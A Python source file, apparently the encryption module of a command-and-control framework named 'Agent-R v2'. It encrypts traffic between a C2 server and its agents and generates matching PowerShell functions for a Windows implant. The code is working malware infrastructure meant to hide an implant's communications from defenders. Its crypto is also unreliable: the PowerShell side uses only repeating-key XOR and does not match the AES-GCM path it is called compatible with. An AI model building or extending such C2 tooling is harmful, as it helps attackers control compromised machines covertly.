"""
Agent-R v2 Crypto Module
AES-GCM encryption for C2 traffic with session key management
"""

import os
import json
import base64
import hashlib
import secrets
from typing import Tuple, Optional


class CryptoHandler:
    """Handles AES-GCM encryption/decryption for C2 communications."""
    
    def __init__(self, master_key: Optional[bytes] = None):
        """Initialize with master key or generate new one."""
        if master_key:
            self.master_key = master_key
        else:
            self.master_key = secrets.token_bytes(32)  # 256-bit key
        
        # Session keys per agent (agent_id -> session_key)
        self.session_keys = {}
    
    def derive_session_key(self, agent_id: str) -> bytes:
        """Derive a unique session key for an agent using HKDF-like approach."""
        if agent_id in self.session_keys:
            return self.session_keys[agent_id]
        
        # Derive key: SHA256(master_key + agent_id)
        derived = hashlib.sha256(self.master_key + agent_id.encode()).digest()
        self.session_keys[agent_id] = derived
        return derived
    
    def encrypt(self, plaintext: bytes, agent_id: str) -> str:
        """Encrypt data for a specific agent. Returns base64 encoded ciphertext."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        except ImportError:
            # Fallback to simple XOR if cryptography not available
            return self._xor_encrypt(plaintext, agent_id)
        
        key = self.derive_session_key(agent_id)
        nonce = secrets.token_bytes(12)  # 96-bit nonce for GCM
        
        aesgcm = AESGCM(key)
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
        
        # Format: base64(nonce + ciphertext)
        return base64.b64encode(nonce + ciphertext).decode()
    
    def decrypt(self, encrypted: str, agent_id: str) -> bytes:
        """Decrypt data from a specific agent."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        except ImportError:
            return self._xor_decrypt(encrypted, agent_id)
        
        raw = base64.b64decode(encrypted)
        nonce = raw[:12]
        ciphertext = raw[12:]
        
        key = self.derive_session_key(agent_id)
        aesgcm = AESGCM(key)
        
        return aesgcm.decrypt(nonce, ciphertext, None)
    
    def _xor_encrypt(self, data: bytes, agent_id: str) -> str:
        """Fallback XOR encryption if cryptography not available."""
        key = self.derive_session_key(agent_id)
        encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        return base64.b64encode(encrypted).decode()
    
    def _xor_decrypt(self, encrypted: str, agent_id: str) -> bytes:
        """Fallback XOR decryption."""
        data = base64.b64decode(encrypted)
        key = self.derive_session_key(agent_id)
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
    
    def get_agent_key_hash(self, agent_id: str) -> str:
        """Get first 8 chars of key hash for verification."""
        key = self.derive_session_key(agent_id)
        return hashlib.sha256(key).hexdigest()[:8]


# For PowerShell agent - generate compatible encryption code
def generate_ps_crypto(master_key_b64: str) -> str:
    """Generate PowerShell code for compatible encryption."""
    return f'''
function Get-SessionKey {{
    param([string]$AgentId)
    $master = [Convert]::FromBase64String("{master_key_b64}")
    $combined = $master + [Text.Encoding]::UTF8.GetBytes($AgentId)
    $sha = [Security.Cryptography.SHA256]::Create()
    return $sha.ComputeHash($combined)
}}

function Encrypt-Data {{
    param([byte[]]$Data, [string]$AgentId)
    $key = Get-SessionKey -AgentId $AgentId
    $encrypted = for($i=0; $i -lt $Data.Length; $i++) {{ $Data[$i] -bxor $key[$i % $key.Length] }}
    return [Convert]::ToBase64String([byte[]]$encrypted)
}}

function Decrypt-Data {{
    param([string]$Encrypted, [string]$AgentId)
    $data = [Convert]::FromBase64String($Encrypted)
    $key = Get-SessionKey -AgentId $AgentId
    return [byte[]](for($i=0; $i -lt $data.Length; $i++) {{ $data[$i] -bxor $key[$i % $key.Length] }})
}}
'''


if __name__ == "__main__":
    # Test
    crypto = CryptoHandler()
    agent_id = "test-agent-1"
    
    original = b"Hello, World! This is a secret message."
    encrypted = crypto.encrypt(original, agent_id)
    decrypted = crypto.decrypt(encrypted, agent_id)
    
    print(f"Original: {original}")
    print(f"Encrypted: {encrypted}")
    print(f"Decrypted: {decrypted}")
    print(f"Match: {original == decrypted}")
